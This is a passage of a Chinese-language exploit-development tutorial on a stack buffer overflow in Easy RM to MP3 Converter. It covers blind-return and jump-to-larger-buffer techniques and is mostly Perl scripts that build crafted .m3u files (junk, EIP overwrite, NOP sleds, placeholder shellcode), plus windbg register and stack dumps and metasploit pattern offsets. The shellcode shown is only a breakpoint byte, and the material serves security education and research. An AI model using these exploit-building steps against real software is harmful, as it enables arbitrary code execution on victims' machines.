利用windbg查找机器码：
0:014> a
7c90120e jmp [esp + 8]
jmp [esp + 8]
7c901212
0:014> u 7c90120e
ntdll!DbgBreakPoint:
7c90120e ff642408 jmp dword ptr [esp+8]
由上可知其机器码为ff642408。
现在可以在一个DLL中搜索以上机器码了，然后用此地址覆写EIP。在例子中，笔者尚未发现其它存在此机器码的地方。当然，你并不能局限
于搜索jmp [esp+8]„你也可以搜索其它大于8字节的指令（，因为你已经控制了上面的8字节„）你可以简单地在shellcode入口处添加一些NOP，
然后使其跳入这些NOP去执行。
（顺便说下：ret的机器码是c3，我想你已经找到了。）
Blind return
此项技术基于以下步骤：
● 利用ret指令地址覆写EIP
● 在ESP首4字节中对shellcode地址进行硬编码
● 当ret执行时，新添加的4字节（最顶端的值）将从栈中弹出，并赋予EIP
● exploit跳至shellcode执行
因此这种方法在以下情况是可用的：
● 无法将EIP直接指向某寄存器（因为无法使用jmp或call指令，这意味着你需要对shellcode起始地址进行硬编码）
● 可控制ESP中的数据（至少前4字节）
为了实现以上情况，你需要拥有shellcode的内存地址（即ESP地址）。通常，需要避免该地址起始于或者包含null bytes，否则你将无法加载位
于EIP之后的shellcode。如果你的shellcode被放至在某地址，而此地址又没有包含null byte，那么这将成为另一可利用的技术。
在DLL中查找‘ret’指令地址。
设置shellcode前4字节（即ESP前4字节）为shellcode起始地址，并用’ret’指令地址覆盖EIP。我们已经在第一部分教程中测试过了，依稀记
得ESP起始于0x000ff730。当然这一地址在不同系统中可能发生改变，但如果你没有其它除硬编码地址之外的方法，那么这就是你唯一可以选
择的方法了。
由于以上地址包含有null byte，因此当构建payload时，我们构造了一个如下情况的缓冲区：
[26094 A’s][address of ret][0x000fff730][shellcode]
在本例中面临的一个问题就是用于覆盖EIP的地址包含有null byte（字符串终止符），因此shellcode并不能放入ESP中。这是一个问题，但我
们不会就此卡住。偶而你可以发现你的缓冲区处于其它地址/寄存器中，比如eax,ebx,ecx等等（看看前面的26094 A’s，它们并不是在覆写EIP
后才被压入栈中的，因为null byte将导致它们失效）。在这种情况下，你可以将寄存器地址作为shellcode（位于ESP起始处，覆盖EIP后直接
执行到此处）前4字节的值，另外仍然用’ret’指令地址覆写EIP。
这种技术利用起来有很多要求和障碍，但仅需要一个“ret”指令„无论如何，这对于Easy RM to MP3来说，并不是真正的可行方案。
应对狭窄型缓冲区：借助通用跳转指令跳至任意地址
我们已经讨论过各种使EIP 跳转至shellcode的方法了。在所有场景下，我们都是奢侈地将shellcode放入一大块缓冲区中。但如果当我们遇到
缓冲区并没有足够的空间来放置整个shellcode，那又当如何利用呢？
在之前的演示中，我们在覆盖EIP之前使用了26094字节，同时可以注意到ESP指向26094+4字节，由此可以知道我们拥有很多内存空间。但
如果我们只有50字节呢（(ESP -> ESP+50 bytes）？如果我们把所有的东西都写入这50字节显然是不可行的！50字节用于存放shellcode也是
不够的，因此我们需要利用其它方法来解决这个问题（也许我们真的可以利用26094字节来触发真实的溢出漏洞）。
首先，我们需要在内存中查找这26094字节。如果没找到，那么这将很难利用它们。实际上，如果可以找到这些字节，同时找出其它指向这些
字节的寄存器，那么可以简单地将shellcode放置在此处即可。如果你已对Easy RM to MP3进行过基本测试，那么可以发现在ESP dump中可以
看到这26094字节：
my $file= "test1.m3u";
my $junk= "A" x 26094;
my $eip = "BBBB";
my $preshellcode = "X" x 54; #let's pretend this is the only space we have available
my $nop = "\x90" x 230; #added some nops to visually separate our 54 X's from other data
open($FILE,">$file");
print $FILE $junk.$eip.$preshellcode.$nop;
close($FILE);
print "m3u File Created successfully\n";
打开test1.m3u文件后，结果如下：
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
+0x42424231:
42424242 ?? ???
0:000> d esp
000ff730 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff740 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff750 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff760 58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 XX..............
000ff770 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff780 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff790 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7a0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0:000> d
000ff7b0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7c0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7d0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7e0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7f0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff800 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff810 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff820 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0:000> d
000ff830 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff840 90 90 90 90 90 90 90 90-00 41 41 41 41 41 41 41 .........AAAAAAA
000ff850 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff860 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff870 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff880 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff890 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
000ff8a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
我们可以看到50个X位于ESP中，假设这是shellcode唯一的可用空间。但是，我们继续顺着堆栈看下去，可以看到A’s的起始地址000ff849
(=ESP+281)。通过其它寄存器，我们并没有看到其它关于A’s或X’s的踪迹（你可以dump寄存器看看，或者在内存中搜索一系列的A字符串）。
我们可以跳至ESP执行代码，但是只有50 bytes可用于放置shellcode。我们可以看看位于栈低位空间的缓冲区的其它部分„实际上，当我们继
续dump ESP中的内容时，可以看到很大一块被A填充的缓冲区：
这里我们可以将shellcode放置到A的位置，然后从X跳转至A。为了实现以上思路，我们需要：
● 26094 A所在的缓冲区现在属于ESP中的一部分,位于000ff849处（在ESP中的A’s起始于哪里呢？如果想将shellcode放置在A’s处，那么我
们就需要知道它位于何处）。
● “Jumpcode”：代码将使X’s跳转到A’s处，这份代码小于50字节（因为在ESP中我们可以直接利用的只有这么大。）
通过猜测，自定义pattern或者metasploits pattern，我们就可以找到正确的地址。这里我们使用metasploit中的一个pattern„我们先使用字符量
较小的pattern（为了寻找A的起始位置，我们无法使用含有大量字符的pattern）。先生成一个1000字符的pattern，然后用它替换perl脚本中前
1000个字符，然后再添加25101个A：
my $file= "test1.m3u";
my $pattern = "Aa0Aa1Aa2Aa3Aa4Aa....g8Bg9Bh0Bh1Bh2B";
my $junk= "A" x 25101;
my $eip = "BBBB";
my $preshellcode = "X" x 54; #let's pretend this is the only space we have available at ESP
my $nop = "\x90" x 230; #added some nops to visually separate our 54 X's from other data in the ESP dump
open($FILE,">$file");
print $FILE $pattern.$junk.$eip.$preshellcode.$nop;
close($FILE);
print "m3u File Created successfully\n";
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
+0x42424231:
42424242 ?? ???
0:000> d esp
000ff730 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff740 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff750 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff760 58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 XX..............
000ff770 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff780 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff790 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7a0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0:000> d
000ff7b0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7c0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7d0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7e0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7f0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff800 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff810 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff820 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0:000> d
000ff830 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff840 90 90 90 90 90 90 90 90-00 35 41 69 36 41 69 37 .........5Ai6Ai7
000ff850 41 69 38 41 69 39 41 6a-30 41 6a 31 41 6a 32 41 Ai8Ai9Aj0Aj1Aj2A
000ff860 6a 33 41 6a 34 41 6a 35-41 6a 36 41 6a 37 41 6a j3Aj4Aj5Aj6Aj7Aj
000ff870 38 41 6a 39 41 6b 30 41-6b 31 41 6b 32 41 6b 33 8Aj9Ak0Ak1Ak2Ak3
000ff880 41 6b 34 41 6b 35 41 6b-36 41 6b 37 41 6b 38 41 Ak4Ak5Ak6Ak7Ak8A
000ff890 6b 39 41 6c 30 41 6c 31-41 6c 32 41 6c 33 41 6c k9Al0Al1Al2Al3Al
000ff8a0 34 41 6c 35 41 6c 36 41-6c 37 41 6c 38 41 6c 39 4Al5Al6Al7Al8Al9
地址000ff849处的数据正是定义的pattern部分。前4字符是5Ai6：
使用metasploit pattern_offset提供的功能，我们可以看到这4个字符偏移量为257。因此我们将文件中的26094 A’s换成257 A’s，再连接shellcode，
最后剩余的26094个字符再用A填充。或者更好一点，我们可以只用250个A开头，然后连接 50个NOP和shellcode，剩余部分用A填充。
使用这种方法，我们无需确切地定位跳转地址。如果我们执行到 shellcode 前的 NOP，那么它也将工作得很好。下面看看脚本及堆栈的具体情
况：
my $file= "test1.m3u";
my $buffersize = 26094;
my $junk= "A" x 250;
my $nop = "\x90" x 50;
my $shellcode = "\xcc";
my $restofbuffer = "A" x ($buffersize-(length($junk)+length($nop)+length($shellcode)));
my $eip = "BBBB";
my $preshellcode = "X" x 54; #let's pretend this is the only space we have available
my $nop2 = "\x90" x 230; #added some nops to visually separate our 54 X's from other data
my $buffer = $junk.$nop.$shellcode.$restofbuffer;
print "Size of buffer : ".length($buffer)."\n";
open($FILE,">$file");
print $FILE $buffer.$eip.$preshellcode.$nop2;
close($FILE);
print "m3u File Created successfully\n";
当程序挂掉后，我们可以看到NOP起始于000ff848，后面跟随着shellcode（0x90位于000ff874）,然后再连接着一串A字符，如下所示：
(188.c98): Access violation - code c0000005 (!!! second chance !!!)
eax=00000001 ebx=00104a58 ecx=7c91005d edx=00000040 esi=77c5fce0 edi=00006715
eip=42424242 esp=000ff730 ebp=003440c0 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
Missing image name, possible paged-out or corrupt data.
+0x42424231:
42424242 ?? ???
0:000> d esp
000ff730 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff740 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff750 58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58 XXXXXXXXXXXXXXXX
000ff760 58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90 XX..............
000ff770 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff780 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff790 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7a0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0:000> d
000ff7b0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7c0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7d0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7e0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff7f0 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff800 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff810 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
000ff820 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................
0:000> d
000ff830 90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90 ................